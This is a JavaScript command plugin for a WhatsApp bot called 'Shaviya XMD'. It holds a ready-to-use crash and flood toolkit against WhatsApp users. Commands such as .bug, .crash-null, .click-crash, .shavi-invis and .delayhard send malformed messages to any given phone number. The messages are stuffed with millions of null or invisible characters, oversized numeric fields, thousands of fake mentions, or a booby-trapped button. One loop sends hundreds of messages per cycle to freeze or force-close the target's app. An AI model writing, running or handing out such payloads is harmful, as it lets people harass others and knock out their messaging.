const { cmd } = require('../command');
const crypto = require('crypto');
const axios = require('axios');
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

if (!generateWAMessageFromContent) {
    try { generateWAMessageFromContent = require('@adiwajshing/baileys').generateWAMessageFromContent; } catch(e) {}
}

async function getImageBuffer(url) {
    try {
        const response = await axios.get(url, { responseType: 'arraybuffer', timeout: 10000 });
        return Buffer.from(response.data);
    } catch (error) {
        return null;
    }
}

function getTarget(args, from, reply, cmdName) {
    if (!args || !args[0]) {
        reply(`❌ *Missing target number!*\n\nUsage: .${cmdName} 947XXXXXXXXX [repeat_count]\nExample: .${cmdName} 94712345678 50`);
        return null;
    }
    return args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
}

// ==================== WORKING PAYLOADS ====================

// 1. Product message (malformed)
async function sendProduct(conn, target) {
    const imageMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg", fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
        fileLength: "93217", caption: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "\u0000".repeat(90000),
        height: 1080, width: 1080, mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
        fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
        directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1778142659",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIRAxIxISIyQWL/2gAMAwEAAhEDEQA/AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
        contextInfo: { pairedMediaType: "NOT_PAIRED_MEDIA", isQuestion: true, isGroupStatus: true },
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        firstScanLength: 9999999999999999999,
        scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
        midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
    };
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                productMessage: {
                    product: {
                        productImage: imageMessage, productId: "449756950375071",
                        title: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "\u0000".repeat(50000),
                        description: "MY Bad" + "\u2060".repeat(60000),
                        priceAmount1000: { low: 999999999, high: 999999999, unsigned: true },
                        url: "wa.me/status", productImageCount: 9999999, firstImageId: "9999999999",
                        salePriceAmount1000: { low: 999999999, high: 999999999, unsigned: true }
                    }, businessOwnerJid: "13135550002@s.whatsapp.net"
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

// 2. Live location message (malformed)
async function sendLocation(conn, target) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                liveLocationMessage: {
                    degreesLatitude: "p".repeat(50000), degreesLongitude: "p".repeat(50000),
                    caption: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "ꦾ".repeat(80000),
                    sequenceNumber: "0", jpegThumbnail: ""
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

// 3. Sticker message (malformed)
async function sendSticker(conn, target) {
    const msg = generateWAMessageFromContent(target, {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4",
            fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
            fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
            mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
            mimetype: "image/webp", fileLength: "9999999999999999999", isAnimated: false,
            contextInfo: { mentionedJid: [target, ...Array.from({ length: 1000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)] }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

// ==================== NEW FUNCTIONS: crash-null & click-crash ====================

// 4. crash-null – sends a view‑once message containing only null bytes (huge)
async function crashNull(conn, target) {
    const nullBomb = "\u0000".repeat(2000000); // 2MB null bytes
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: { hasMediaAttachment: false },
                    body: { text: nullBomb },
                    nativeFlowMessage: { messageParamsJson: nullBomb }
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

// 5. click-crash – interactive message with a button that, when clicked, crashes WhatsApp
async function clickCrash(conn, target) {
    const crashPayload = JSON.stringify({
        display_text: "💀 CRASH ME 💀",
        id: "crash_" + "X".repeat(50000)
    });
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: { title: "⚠️ SYSTEM WARNING ⚠️", hasMediaAttachment: false },
                    body: { text: "Click the button below to continue..." + "\u0000".repeat(50000) },
                    footer: { text: "Your device will be affected." },
                    nativeFlowMessage: {
                        messageParamsJson: "{".repeat(50000),
                        buttons: [
                            { name: "quick_reply", buttonParamsJson: crashPayload },
                            { name: "single_select", buttonParamsJson: crashPayload },
                            { name: "call_permission_request", buttonParamsJson: crashPayload }
                        ]
                    }
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

// ==================== MASSIVE ATTACK (repeatable cycles) ====================
async function massiveAttack(conn, target, cycles) {
    for (let cycle = 1; cycle <= cycles; cycle++) {
        console.log(`🔥 Cycle ${cycle}/${cycles} for ${target}`);
        // Send 100 of each working type + new crash-null and click-crash once per cycle
        for (let i = 0; i < 100; i++) {
            await sendProduct(conn, target);
            await sendLocation(conn, target);
            await sendSticker(conn, target);
        }
        await crashNull(conn, target);
        await clickCrash(conn, target);
        await new Promise(r => setTimeout(r, 200));
    }
}

// ==================== OTHER COMMANDS ====================
async function invisibleCrash(conn, target) {
    const invisibleText = '\u2060'.repeat(500000) + '\u2063'.repeat(500000);
    const msg = generateWAMessageFromContent(target, {
        interactiveMessage: {
            header: { locationMessage: { degreesLatitude: 9999, degreesLongitude: 9999 }, hasMediaAttachment: true },
            body: { text: invisibleText },
            nativeFlowMessage: { messageParamsJson: '\u0000'.repeat(1000000) },
            contextInfo: { mentionedJid: Array.from({ length: 1000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`) }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

async function delayHardCrash(conn, target) {
    const mentionedList = [ "13135550002@s.whatsapp.net", ...Array.from({ length: 5000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`) ];
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                stickerMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
                    fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
                    fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
                    mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
                    mimetype: "image/webp", directPath: "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
                    fileLength: { low: 999, high: 0, unsigned: true }, mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                    firstFrameLength: 19904, firstFrameSidecar: "KN4kQ5pyABRAgA==", isAnimated: true,
                    contextInfo: { participant: target, mentionedJid: mentionedList },
                    stickerSentTs: { low: -1939477883, high: 555, unsigned: false }
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

// ==================== COMMANDS ====================
cmd({
    pattern: "bug",
    desc: "💀 MASSIVE CRASH – product+location+sticker+null+click (repeatable)",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "bug");
    if (!target) return;
    let cycles = parseInt(args[1]);
    if (isNaN(cycles) || cycles < 1) cycles = 1;
    if (cycles > 500) cycles = 500;
    await reply(`💀 *SHAVIYA XMD COMBO CRASH* → ${target}\n_Running ${cycles} cycle(s) (300+ msgs + null + click per cycle)..._`);
    try {
        await massiveAttack(conn, target, cycles);
        const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
        const caption = `✅ COMBO CRASH DELIVERED → ${target}\n⚠️ *Target WhatsApp flooded (${cycles * 302}+ messages). Expect black screen / force close.*`;
        if (successImg) {
            await conn.sendMessage(from, { image: successImg, caption });
        } else {
            await reply(caption);
        }
    } catch (err) {
        console.error(err);
        await reply(`❌ Failed: ${err.message}`);
    }
});

cmd({
    pattern: "crash-null",
    desc: "💀 NULL CRASH – 2MB null bytes (invisible, freezes client)",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "crash-null");
    if (!target) return;
    await reply(`💀 *NULL CRASH* → ${target}\n_Sending 2MB null bomb..._`);
    try {
        await crashNull(conn, target);
        const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
        if (successImg) {
            await conn.sendMessage(from, { image: successImg, caption: `✅ NULL CRASH SENT → ${target}\n⚠️ *Target WhatsApp will freeze/hang.*` });
        } else {
            await reply(`✅ NULL CRASH SENT → ${target}\n⚠️ *Target WhatsApp will freeze/hang.*`);
        }
    } catch (err) {
        console.error(err);
        await reply(`❌ Failed: ${err.message}`);
    }
});

cmd({
    pattern: "click-crash",
    desc: "💀 CLICK CRASH – Malformed button that crashes when clicked",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "click-crash");
    if (!target) return;
    await reply(`💀 *CLICK CRASH* → ${target}\n_Sending malformed interactive button..._`);
    try {
        await clickCrash(conn, target);
        const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
        if (successImg) {
            await conn.sendMessage(from, { image: successImg, caption: `✅ CLICK CRASH SENT → ${target}\n⚠️ *If target clicks the button, WhatsApp will force close.*` });
        } else {
            await reply(`✅ CLICK CRASH SENT → ${target}\n⚠️ *If target clicks the button, WhatsApp will force close.*`);
        }
    } catch (err) {
        console.error(err);
        await reply(`❌ Failed: ${err.message}`);
    }
});

cmd({
    pattern: "shavi-invis",
    desc: "🔮 INVISIBLE CRASH – No visible text, silent freeze",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "shavi-invis");
    if (!target) return;
    await reply(`🔮 *SHAVIYA XMD INVISIBLE CRASH* → ${target}`);
    try {
        await invisibleCrash(conn, target);
        const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
        if (successImg) {
            await conn.sendMessage(from, { image: successImg, caption: `✅ INVISIBLE CRASH SENT → ${target}\n⚠️ *Target will freeze with no visible message.*` });
        } else {
            await reply(`✅ INVISIBLE CRASH SENT → ${target}\n⚠️ *Target will freeze with no visible message.*`);
        }
    } catch (err) {
        console.error(err);
        await reply(`❌ Failed: ${err.message}`);
    }
});

cmd({
    pattern: "delayhard",
    desc: "💀 EXTREME DELAY CRASH – Sticker + massive mentions",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "delayhard");
    if (!target) return;
    await reply(`💀 *DELAY HARD CRASH* → ${target}\n_Sending sticker bomb..._`);
    try {
        await delayHardCrash(conn, target);
        const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
        if (successImg) {
            await conn.sendMessage(from, { image: successImg, caption: `✅ DELAY HARD SENT → ${target}\n⚠️ *Target WhatsApp will freeze / lag severely.*` });
        } else {
            await reply(`✅ DELAY HARD SENT → ${target}\n⚠️ *Target WhatsApp will freeze / lag severely.*`);
        }
    } catch (err) {
        console.error(err);
        await reply(`❌ Failed: ${err.message}`);
    }
});

cmd({
    pattern: "bugmenu",
    desc: "Show crash menu",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply }) => {
    const menuText = `*╭─「 👑 Sʜᴀᴠɪʏᴀ Xᴍᴅ Cʀᴀsʜ Mᴇɴᴜ 」─*\n*│ 📌 .bug [num] [cycles] – 💀 MASSIVE combo (all types)*\n*│ 📌 .crash-null – 💀 2MB null bomb*\n*│ 📌 .click-crash – 💀 Button crash (click = force close)*\n*│ 📌 .shavi-invis – 🔮 Invisible freeze*\n*│ 📌 .delayhard – 💀 Sticker flood*\n*╰──────────────●●►*\n> 💡 *Examples:*\n> .bug 94712345678 1\n> .crash-null 94712345678\n> ⚠️ *Use only on numbers you own.*`;
    const menuImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/nsa.jpg");
    if (menuImg) {
        await conn.sendMessage(from, { image: menuImg, caption: menuText });
    } else {
        await reply(menuText);
    }
});
